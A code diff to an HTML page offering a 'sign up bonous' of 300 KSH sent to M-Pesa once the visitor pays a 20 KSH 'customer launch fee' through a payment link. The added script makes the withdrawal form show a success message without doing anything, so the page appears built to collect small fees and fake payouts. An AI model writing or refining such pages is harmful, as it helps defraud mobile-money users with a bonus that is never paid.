@@ -8,8 +8,12 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
     <link rel="stylesheet" href="styles.css" />
     <style>
-      .message {
-        color: green;
+      .banner {
+        background-color: green;
+        color: white;
+        padding: 10px;
+        text-align: center;
+        border-radius: 5px;
         display: none;
         margin-top: 10px;
       }
@@ -21,6 +25,7 @@
         border-radius: 5px;
         text-align: center;
         display: none;
+        margin-top: 10px;
       }
     </style>
   </head>
@@ -124,9 +129,38 @@
                   </span>
                 </a>
               </article>
-              <!-- Other articles here -->
+              <article class="tile">
+                <div class="tile-header">
+                  <i class="ph-fire-simple-light"></i>
+                  <h3>
+                    <span>Top up airtime</span>
+                    <span>safaricom plc</span>
+                  </h3>
+                </div>
+                <a href="https://airtime.africomltd.com/">
+                  <span>Go to service</span>
+                  <span class="icon-button">
+                    <i class="ph-caret-right-bold"></i>
+                  </span>
+                </a>
+              </article>
+              <article class="tile">
+                <div class="tile-header">
+                  <i class="ph-file-light"></i>
+                  <h3>
+                    <span>sign up bonous</span>
+                    <span>free ksh 300.By paying 20ksh you activate your account bonous of 300/= sent direct to your mpesa.</span>
+                  </h3>
+                </div>
+                <a href="https://app.payhero.co.ke/lipwa/835">
+                  <span>Continue to pay</span>
+                  <span class="icon-button">
+                    <i class="ph-caret-right-bold"></i>
+                  </span>
+                </a>
+              </article>
             </div>
-            <div class="message" id="wallet-message">
+            <div class="banner" id="wallet-banner">
               Make sure you have made your customer launch fee of 20 KSH.
             </div>
             <div id="withdrawal-form" style="display: none;">
@@ -154,17 +188,22 @@
     <script>
       document.getElementById('wallet-link').addEventListener('click', function (event) {
         event.preventDefault();
-        document.getElementById('wallet-message').style.display = 'block';
-        document.getElementById('withdrawal-form').style.display = 'block';
+        const banner = document.getElementById('wallet-banner');
+        banner.style.display = 'block';
+        setTimeout(function () {
+          banner.style.display = 'none';
+          document.getElementById('withdrawal-form').style.display = 'block';
+        }, 3000); // Banner displays for 3 seconds
       });
 
       document.getElementById('withdraw-form').addEventListener('submit', function (event) {
         event.preventDefault();
-        document.getElementById('withdrawal-success').style.display = 'block';
+        const successMessage = document.getElementById('withdrawal-success');
+        successMessage.style.display = 'block';
         setTimeout(function () {
-          document.getElementById('withdrawal-success').style.display = 'none';
-        }, 12000); // 12 seconds delay
+          successMessage.style.display = 'none';
+        }, 12000); // 12 seconds delay for the success message
       });
     </script>
   </body>
-              </html>
+        </html>
